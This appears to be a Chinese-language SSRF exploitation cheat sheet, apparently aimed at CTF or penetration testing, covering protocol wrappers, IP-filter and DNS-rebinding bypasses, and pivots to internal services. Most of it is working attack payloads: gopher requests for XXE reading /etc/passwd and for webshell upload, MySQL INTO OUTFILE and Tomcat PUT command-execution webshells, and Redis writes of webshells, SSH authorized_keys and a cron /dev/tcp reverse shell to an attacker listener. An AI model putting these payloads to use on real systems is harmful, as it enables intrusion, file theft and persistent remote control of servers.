### 1. `file://` 协议包装器

**核心原理：**

`file://` 协议包装器允许访问存在 SSRF 漏洞的服务器的本地文件系统。这可以用来读取敏感文件。

**利用与信息收集：**

* **探测 SSRF 与读取常见文件：**
    * `file:///etc/passwd`：尝试读取 Linux 系统上的用户列表。成功读取可以确认 SSRF 漏洞并泄露系统用户。
    * `file:///etc/hosts`：读取 hosts 文件，这可以泄露内部网络的 DNS 映射以及潜在的其他服务器主机名。
* **内部网络侦察 (Linux)：**
    * `file:///proc/net/arp`：读取 ARP 缓存。此表列出了服务器最近通信过的本地网段上设备的 IP 地址和对应的 MAC 地址。这有助于绘制内部网络拓扑。
        * **提示：** 要用更多内部主机填充或更新此 ARP 表，您可以将 SSRF 与对可疑内部 IP 段的请求（例如，如果 SSRF 允许其他协议，则通过 `http://`）结合起来。当服务器尝试连接时，其 ARP 表将会更新。
    * `file:///proc/net/fib_trie`：显示内核的转发表信息库 (FIB) trie，它可以揭示服务器网络接口的路由信息，包括配置的子网和网关。

---

### 2. `dict://` 协议包装器

**核心原理：**

`dict://` 协议包装器用于与 DICT (Dictionary Server Protocol) 服务器交互。然而，它经常被滥用来向任何主机的任何 TCP 端口发送任意数据，使其可用于端口扫描或向不需要复杂握手的服务发送简单命令。

**利用与信息收集：**

* **端口扫描：**
    * `dict://<目标IP>:<端口>/info`：尝试连接到指定 `<目标IP>` 的 `<端口>`。如果服务正在监听，服务器可能会返回一个banner或一些信息（尽管 `info` 命令本身通常与目标服务无关，但连接尝试本身是有用的）。这可以用于识别通过其他 SSRF 技术发现的内部主机上的开放端口（例如，从 ARP 缓存中）。
    * **注意：** 如果未指定，DICT 协议默认端口为 2628。

---

### 3. `http://` 或 `https://` 协议包装器

**核心原理：**

这些是 SSRF 中最常用的协议包装器。它们指示易受攻击的服务器向指定的 URL 发出 HTTP 或 HTTPS 请求。这可以是外部 URL，或者更关键的是，内部 URL。

**利用与信息收集：**

* **内部目录/文件扫描：**
    * `http://192.168.1.201/flag.php`：服务器向 `http://192.168.1.201/flag.php` 发出 GET 请求。这可以用于访问内部 Web 应用程序、管理界面或未对外暴露的特定文件。
    * 通过迭代常见的路径或内部 IP 地址，攻击者可以绘制出内部 Web 服务的拓扑。

---

### 4. `gopher://` 协议包装器

**核心原理：**

`gopher://` 协议包装器对于 SSRF 非常灵活，因为它允许向指定的主机和端口发送任意 TCP 载荷。这意味着您可以为各种协议（不仅仅是 HTTP）构造原始请求。它有效地将 SSRF 转变为 TCP 服务的通用代理。

**重要注意事项：**

* **默认端口：** Gopher 默认端口为 70。请始终在您的载荷 URL 中为目标服务指定正确的端口（例如，`gopher://192.168.1.201:80/_...`）。
* **字符剥离：** 许多 `curl` 版本（通常是 SSRF 的后端）或 PHP 的 `gopher://` 处理可能会剥离载荷的第一个字符。为了解决这个问题，请在实际载荷前添加一个额外的字符（例如，下划线 `_`）。例如，如果您的 HTTP 请求以 `GET /` 开头，您的 gopher 载荷将以 `_GET /` 开头。
* **URL 编码：** 通过 gopher 发送的载荷数据必须进行 URL 编码。如果您将此载荷注入到一个会被 URL 解码一次的上下文中（例如 URL 中的 GET 参数），然后 `curl` 或 PHP 包装器再次对其进行解码，您可能需要对载荷中的特殊字符进行**两次 URL 编码**。当通过 Burp Suite 之类的工具（浏览器或工具会处理第一层编码）制作和注入载荷时尤其如此。

**利用示例：**

* **构造 GET 请求：**
    ```
    gopher://<目标IP>:<端口>/_GET /flag.php HTTP/1.1%0d%0AHost: <目标IP>%0d%0A%0d%0A
    ```
    * **载荷分解：**
        * `_`：牺牲字符。
        * `GET /flag.php HTTP/1.1`：HTTP 请求行。
        * `%0d%0A`：URL 编码的 CRLF (回车，换行)，用于 HTTP 中的新行。
        * `Host: <目标IP>`：HTTP Host 头部。
        * `%0d%0A%0d%0A`：两个 CRLF 表示头部结束。

* **构造 POST 请求：**
    ```
    gopher://<目标IP>:<端口>/_POST /flag.php HTTP/1.1%0d%0AHost: <目标IP>%0d%0AContent-Type: application/x-www-form-urlencoded%0d%0AContent-Length: 6%0d%0A%0d%0Acmd=ls
    ```
    * **载荷分解：**
        * `_`：牺牲字符。
        * `POST /flag.php HTTP/1.1`：HTTP 请求行。
        * `Host: <目标IP>`：Host 头部。
        * `Content-Type: application/x-www-form-urlencoded`：Content-Type 头部。
        * `Content-Length: 6`：POST 主体的长度 (`cmd=ls` 是 6 字节)。
        * `%0d%0A%0d%0A`：头部结束。
        * `cmd=ls`：POST 主体。

---

### 5. 绕过 IP 地址过滤器 (针对本地回环/内部地址)

**核心原理：**

应用程序可能具有阻止 SSRF 指向 `127.0.0.1` 或其他本地/内部 IP 地址的防御措施。有时可以通过使用 IP 地址的替代表示形式来绕过这些防御。

**针对 `127.0.0.1` (或其他 IP) 的绕过技术：**

* **十进制 (整数) 表示：** 将 IP 地址转换为其单个整数十进制形式。
    * 示例：`127.0.0.1` = `2130706433`。因此，使用 `http://2130706433/`。
* **八进制表示：** 将 IP 地址的每个八位字节转换为八进制。
    * 示例：`127.0.0.1` = `0177.00.00.01`。因此，使用 `http://0177.0.0.01/` (许多解析器会将前导零视为八进制)。
* **十六进制表示：** 将每个八位字节或整个 IP 转换为十六进制。
    * 示例 (每个八位字节)：`127.0.0.1` = `0x7f.0x00.0x00.0x01`。
    * 示例 (整个 IP)：`127.0.0.1` = `0x7f000001`。因此，使用 `http://0x7f000001/`。
* **混合/部分编码：** 某些解析器可能会被混合编码或使用部分点分表示法 (例如，`127.1`，通常解析为 `127.0.0.1`) 所欺骗。
* **使用 `localhost` 或其他指向目标的可解析名称。**

---

### 6. 302 重定向绕过

**核心原理：**

如果易受 SSRF 攻击的应用程序遵循 HTTP 重定向（如 301 或 302），您可以在攻击者控制的公共服务器上托管一个脚本。当易受攻击的应用程序通过 SSRF 向此公共服务器发出请求时，您的脚本会发出一个重定向（例如 HTTP 302）到内部 IP 地址（如 `127.0.0.1` 或内部 RFC1918 地址）。

**执行流程：**

1.  攻击者在 `http://attacker.com/redirect.php` 上托管一个脚本。
2.  `redirect.php` 包含类似以下代码：`<?php header("Location: http://127.0.0.1/admin"); ?>`
3.  攻击者使用 `http://attacker.com/redirect.php` 触发 SSRF。
4.  易受攻击的服务器请求 `http://attacker.com/redirect.php`。
5.  `attacker.com` 响应 `302 Found` 和 `Location: http://127.0.0.1/admin`。
6.  如果易受攻击的服务器遵循重定向，它随后将向 `http://127.0.0.1/admin` 发出请求，从而绕过针对内部 IP 的直接过滤器。

---

### 7. DNS 重绑定绕过

**核心原理：**

DNS 重绑定利用 DNS 记录的生存时间 (TTL) 值。攻击者控制一个 DNS 名称，并为其配置一个非常短的 TTL。

**执行流程：**

1.  攻击者注册一个域名 (例如，`attacker-rebind.com`)。
2.  攻击者为其 `attacker-rebind.com` 的 DNS 服务器配置两条 (或更多) A 记录：
    * 一条指向**外部 IP** 地址 (例如，攻击者的服务器)。
    * 一条指向**目标内部 IP** 地址 (例如，`127.0.0.1`)。
    * 这些记录的 TTL 设置为一个非常低的值 (例如，1 秒)。
3.  **第一次请求：** 易受攻击的应用程序解析 `attacker-rebind.com`。DNS 服务器返回**外部 IP**。应用程序可能会执行一些检查 (例如，它是否是公共 IP？) 并缓存此结果。
4.  **第二次请求 (或 TTL 过期后)：** 应用程序再次向 `attacker-rebind.com` 发出请求。由于 TTL 非常短，缓存的 DNS 条目可能已过期，从而强制进行新的 DNS 查找。这一次，攻击者的 DNS 服务器响应**内部 IP** (`127.0.0.1`)。
5.  应用程序现在认为 `attacker-rebind.com` 解析为 `127.0.0.1`，因此向内部 IP 发出请求，绕过了基于 IP 的 SSRF 过滤器。

**查找服务：** 存在许多公共的“DNS 重绑定”服务，或者您可以设置自己的服务。

---

### 8. SSRF 到 XXE (XML 外部实体注入) 利用

**核心原理：**

如果内部服务处理 XML 并且容易受到 XXE 攻击，您可以使用 SSRF (通常通过 `gopher://` 或 `http://` POST) 向该内部服务发送恶意的 XML 载荷，从而触发 XXE。

**载荷构造 (通过 Gopher POST)：**

目标是一个接受 XML 的内部端点 `/flag.php`。

```
gopher://<内部XXE服务IP>:<端口>/_POST /flag.php HTTP/1.1%0d%0AHost: <内部XXE服务IP>%0d%0AContent-Type: application/xml;charset=utf-8%0d%0AContent-Length: <XML载荷长度>%0d%0A%0d%0A<!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>&xxe;</password></user>
```

* **关键 Gopher 部分：**
    * `_POST /flag.php HTTP/1.1`：标准的 POST 请求。
    * `Content-Type: application/xml;charset=utf-8`：指定 XML 内容。
    * `Content-Length`：必须与 XML 载荷的字节长度匹配。
* **XML 载荷：**
    * `<!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]>`：定义一个外部实体 `xxe`，指向 `/etc/passwd`。
    * `<user><username>&xxe;</username><password>&xxe;</password></user>`：XML 数据，当内部服务解析此 XML 时，`&xxe;` 将被 `/etc/passwd` 的内容替换。

内部服务的响应 (可能会通过初始 SSRF 点中继回来) 将包含 `/etc/passwd` 的内容。

---

### 9. SSRF 到文件上传利用

**核心原理：**

如果内部服务具有文件上传功能，可以使用 SSRF (通常使用 `gopher://` 构造 `multipart/form-data` POST 请求) 将恶意文件 (例如，Web Shell) 上传到该内部服务器。

**载荷构造 (通过 Gopher POST)：**

目标是一个内部的 `/flag.php` (假设它处理文件上传)。

```
gopher://<内部上传服务IP>:<端口>/_POST /flag.php HTTP/1.1%0d%0AHost: <内部上传服务IP>%0d%0AContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryT6Y8KVzK8lYyjzQ9%0d%0AContent-Length: <multipart载荷长度>%0d%0A%0d%0A------WebKitFormBoundaryT6Y8KVzK8lYyjzQ9%0d%0AContent-Disposition: form-data; name="file"; filename="shell.php"%0d%0AContent-Type: image/jpeg%0d%0A%0d%0A<?php phpinfo();?>%0d%0A------WebKitFormBoundaryT6Y8KVzK8lYyjzQ9%0d%0AContent-Disposition: form-data; name="submit"%0d%0A%0d%0ASubmit%0d%0A------WebKitFormBoundaryT6Y8KVzK8lYyjzQ9--
```

* **关键 Gopher 部分：**
    * `Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT6Y8KVzK8lYyjzQ9`：定义文件上传的内容类型和边界字符串。边界字符串在整个载荷中必须一致。
    * `Content-Length`：必须是 multipart 主体的总长度。
* **Multipart 主体分解：**
    * `------WebKitFormBoundaryT6Y8KVzK8lYyjzQ9`：边界分隔符。
    * `Content-Disposition: form-data; name="file"; filename="shell.php"`：定义表单字段名称 (`file`) 和上传内容的文件名 (`shell.php`)。
    * `Content-Type: image/jpeg`：(可以是任何类型，有时用于绕过简单的检查。实际内容是 PHP。)
    * `<?php phpinfo();?>`：恶意文件内容 (一个简单的 PHP info shell)。
    * `%0d%0A`：URL 编码的 CRLF，用于分隔行和部分。
    * 载荷以边界后跟 `--` 结束。

---

### 10. SSRF 到 MySQL 未授权查询 (数据库)

**核心原理：**

如果内部 MySQL 服务器在没有身份验证的情况下监听 (或者具有可通过 SSRF 访问的服务器已知的弱凭据)，您可以使用 `gopher://` 发送原始 MySQL 协议数据包来执行查询。

**执行步骤与载荷构造：**

1.  **捕获 MySQL 流量：**
    * 在您可以本地连接到 MySQL 服务器 (或与目标版本相同的服务器) 的计算机上使用 `tcpdump` 捕获简单查询的原始网络流量。
    * 示例：`sudo tcpdump -i lo -w mysql.pcapng port 3306` (在回环接口上监听)。
2.  **执行示例查询：**
    * 在 `tcpdump` 运行时，连接到您的本地/测试 MySQL 并执行所需的查询。强制使用简单密码模式或禁用 SSL 可能会简化捕获的数据包。
    * 示例：`mysql -h127.0.0.1 -uroot --ssl-mode=DISABLED -e "show databases;"`
3.  **分析捕获的数据包：**
    * 在 Wireshark 中打开 `mysql.pcapng`。
    * 跟踪 MySQL 连接的 TCP 流 (通常以客户端握手、服务器问候、然后是登录请求、然后是查询请求开始)。
    * 隔离发送您的查询 (例如，“show databases;”) 的**请求数据包**。
    * 提取此数据包的**原始十六进制数据**。
4.  **准备 Gopher 载荷：**
    * 从十六进制数据中删除任何换行符或格式。
    * gopher 的载荷是原始数据包数据，通常进行 URL 编码。通常仍需要前导下划线 `_`。
    * 示例结构：`gopher://<内部MySQL IP>:3306/_<十六进制编码的MySQL数据包数据>`
5.  **简化工具：**
    * 像 **tarunkant/Gopherus** 这样的工具可以自动为包括 MySQL 在内的各种服务生成 gopher 载荷。

---

### 11. SSRF 到 MySQL：写入 Web Shell (文件输出)

**核心原理：**

如果 (SSRF 连接所使用的) MySQL 用户具有 `FILE` 权限，并且您知道一个 Web 可写目录，则可以使用 `SELECT ... INTO OUTFILE` 或 `SELECT ... INTO DUMPFILE` 将 Web Shell 写入服务器。

**先决条件：**

* SSRF 到 MySQL (如第 10 点所述)。
* MySQL 用户具有 `FILE` 权限。
* 了解目标服务器上 MySQL 可以写入的 Web 可访问目录。
* MySQL 变量 `secure_file_priv` 必须允许写入目标路径 (如果为空，则允许在任何地方写入；如果是特定路径，则只能在该路径下写入；如果为 `NULL`，则禁用 `INTO OUTFILE`)。

**执行步骤：**

1.  **检查 `secure_file_priv` (如果可以通过初始查询进行)：**
    * SQL 查询：`show variables like '%secure_file_priv%';`
2.  **构造写入 Web Shell 的查询：**
    * SQL 查询：`select "<?php system($_GET['cmd']);?>" into outfile '/var/www/html/shell.php';`
        * 将 `/var/www/html/shell.php` 替换为正确的 Web 可写路径和所需的 shell 文件名。
3.  **通过 SSRF/Gopher 传递：**
    * 将此 SQL 查询转换为 MySQL 数据包，并使用第 10 点中描述的 gopher 方法传递它。

---

### 12. SSRF 到 Tomcat：文件写入 (PUT 请求) (Tomcat)

**核心原理：**

Apache Tomcat 的某些配置（如果未正确保护，例如 `DefaultServlet` 的 `readonly` 初始化参数设置为 `false`）允许通过 HTTP PUT 请求进行任意文件上传。SSRF 漏洞可用于向内部 Tomcat 服务器发送此类 PUT 请求。

**载荷构造 (概念性的 HTTP PUT - 需要包装在 Gopher 中或在 SSRF 允许原始 HTTP POST/PUT 时直接发送)：**

```http
PUT /1.jsp/ HTTP/1.1
Host: <内部Tomcat IP>:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: <JSP代码长度>

<%-- JSP Web Shell 代码 --%>
<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in = Runtime.getRuntime().exec(command).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a = in.read(b)) != -1)
        {
            // 以字符串形式打印，如果出现问题，请确保字符编码正确
            out.println(new String(b, 0, a));
        }
        out.print("</pre>");
    } else {
        out.print("format: xxx.jsp?cmd=Command");
    }
%>
```

* **关于 `PUT /1.jsp/` 的说明：** 路径中的尾部斜杠 (`/1.jsp/`) 是一个技巧，有时可以绕过限制或与某些 Tomcat 配置一起使用以允许写入 `1.jsp`。
* **Gopher 包装：** 此原始 HTTP PUT 请求需要为 `gopher://` 包装器进行格式化 (前置 `_`，对特殊字符进行 URL 编码，并正确计算 `Content-Length`)。

---

### 13. SSRF 到 Redis：未授权写入 Web Shell (通过 RDB 备份)

**核心原理：**

如果内部 Redis 实例无需身份验证即可访问，您可以使用 SSRF (通过 `gopher://`) 发送 Redis 命令。通过将 Redis 的 RDB 备份目录 (`dir`) 设置为 Web 可访问路径，将 RDB 文件名 (`dbfilename`) 设置为 shell 扩展名 (例如 `shell.php`)，然后将 PHP 代码作为 Redis 键的值插入，最后触发 `SAVE` 或 `BGSAVE`，您可以写入一个 Web Shell。

**Redis 命令 (按顺序发送或在单个载荷中发送)：**

1.  `CONFIG SET dir /var/www/html/` (将备份目录设置为 Web 根目录)
2.  `CONFIG SET dbfilename shell.php` (设置备份文件名)
3.  `SET payload "<?php phpinfo(); ?>"` (将 PHP shell 代码存储在名为 `payload` 的键中)
    * 或者，为避免原始字符串周围的 RDB 格式前缀/后缀问题，您可以填充它：`SET payload "\n\n\n<?php phpinfo(); ?>\n\n\n"`
4.  `SAVE` (或 `BGSAVE`) (将当前数据库保存到磁盘，在 `/var/www/html/` 中创建 `shell.php`)
5.  `QUIT` (可选，用于干净地关闭连接)

**载荷构造 (Gopher)：**

1.  **捕获 Redis 流量 (可选，用于理解)：**
    * `tcpdump -i <接口> tcp and port 6379 -w redis.pcapng`
2.  **模拟命令：** 本地连接到 Redis 或测试实例并运行上述命令。
3.  **为 Gopher 格式化：**
    * Redis 命令以 RESP (REdis Serialization Protocol) 格式发送。命令的每个部分都是一个批量字符串 (bulk string)。
    * RESP 中 `SET key value` 的示例 (简化版，对于 Gopher 通常只需要换行符)：
        ```
        *3%0d%0A$3%0d%0ASET%0d%0A$3%0d%0Akey%0d%0A$5%0d%0Avalue%0d%0A
        ```
    * 发送到 gopher 的载荷将是这些命令的串联，每个命令都经过正确格式化和 URL 编码。记住前导下划线 `_`。
    * 示例结构：`gopher://<内部Redis IP>:6379/_<RESP格式化的命令>`
4.  **工具：** **tarunkant/Gopherus** 非常适合生成这些 Redis gopher 载荷。

---

### 14. SSRF 到 Redis：未授权写入 SSH 公钥

**核心原理：**

与写入 Web Shell 类似，如果内部 Redis 服务器无需身份验证即可访问，并且您知道目标用户的主目录 (例如 `/root/.ssh/` 或 `/home/user/.ssh/`)，则可以将您的 SSH 公钥写入 `authorized_keys` 文件。这允许以该用户身份对服务器进行无密码 SSH 访问。

**先决条件：**

* SSRF 到 Redis。
* 目标服务器已启用 SSH。
* 已知目标用户的 `.ssh` 目录和 `authorized_keys` 文件的路径。
* Redis 进程必须对此路径具有写权限。

**执行步骤：**

1.  **生成 SSH 密钥对：**
    * `ssh-keygen -t rsa` (创建 `id_rsa` 私钥和 `id_rsa.pub` 公钥)。
2.  **准备公钥内容：**
    * 复制您的 `id_rsa.pub` 文件的内容。它是一行文本。
    * 在将密钥内容注入 Redis 时，通常最好在密钥内容前后添加换行符，以确保它在 `authorized_keys` 中独占一行 (例如，`\n\n<您的公钥字符串>\n\n`)。
3.  **Redis 命令 (通过 Gopher 发送)：**
    1.  `CONFIG SET dir /root/.ssh/` (设置 `authorized_keys` 的目标目录；根据需要调整用户/路径)
    2.  `CONFIG SET dbfilename authorized_keys` (设置文件名)
    3.  `SET sshkey "<您格式化后的公钥字符串>"` (将公钥存储在 Redis 键中)
    4.  `SAVE` (写入 `authorized_keys`)
4.  **构造 Gopher 载荷：**
    * 使用与 Web Shell 相同的方法 (第 13 点)，但使用上面的 Redis 命令。Gopherus 可以提供帮助。
5.  **通过 SSH 连接：**
    * 一旦发送了 gopher 载荷并且 Redis 保存完毕，尝试 SSH 连接：
        `ssh -i /path/to/your/id_rsa <用户>@<目标服务器IP>` (如果 SSH 不在 22 端口，请使用相应端口)。

---

### 15. SSRF 到 Redis：未授权写入基于 Cron 的反弹 Shell

**核心原理：**

如果无法写入 Web 目录或 SSH 路径，可以尝试通过 Redis 写入 cron 作业。这包括将 Redis 备份目录设置为 cron spool 目录 (如 `/var/spool/cron/` 或 `/etc/cron.d/`)，并将文件名设置为有效的用户名 (例如 `root`)。存储在 Redis 中的“值”将是一个执行反弹 shell 的 cron 作业条目。

**先决条件：**

* SSRF 到 Redis。
* Redis 对 cron 目录具有写权限。
* 了解 cron 目录以及 cron 作业的格式。

**执行步骤与 Redis 命令 (通过 Gopher)：**

1.  **制作 Cron 作业载荷：**
    * 反弹 shell 的示例 cron 条目 (每分钟执行一次)：
        `* * * * * /bin/bash -i >& /dev/tcp/<您的监听IP>/<您的监听端口> 0>&1`
    * 这需要是 Redis 键的内容。如果目标 cron 守护程序需要，请确保有适当的换行符 (行尾的 `\n` 至关重要)。
2.  **Redis 命令：**
    1.  `CONFIG SET dir /var/spool/cron/crontabs/` (或 `/etc/cron.d/` 或类似路径，取决于操作系统)
        * 如果使用 `/etc/cron.d/`，`dbfilename` 可以是任何有效的文件名，例如 `redis-shell`。
        * 如果使用 `/var/spool/cron/crontabs/` (或 `/var/spool/cron/`)，`dbfilename` 必须是系统上的**有效用户名**，例如 `root`。
    2.  `CONFIG SET dbfilename root` (或为 `/etc/cron.d/` 选择的文件名)
    3.  `SET cronjob "* * * * * /bin/bash -i >& /dev/tcp/<您的监听IP>/<您的监听端口> 0>&1\n"`
    4.  `SAVE`
3.  **设置监听器：**
    * 在机器 (`<您的监听IP>`) 上启动一个监听器：`nc -lvp <您的监听端口>`
4.  **构造 Gopher 载荷：**
    * 使用 **tarunkant/Gopherus** 或如第 13 点所述手动构造。

一旦 Redis 保存了 RDB 文件 (现在是 cron 文件)，cron 守护程序应该会获取它并执行反弹 shell，连接回监听器。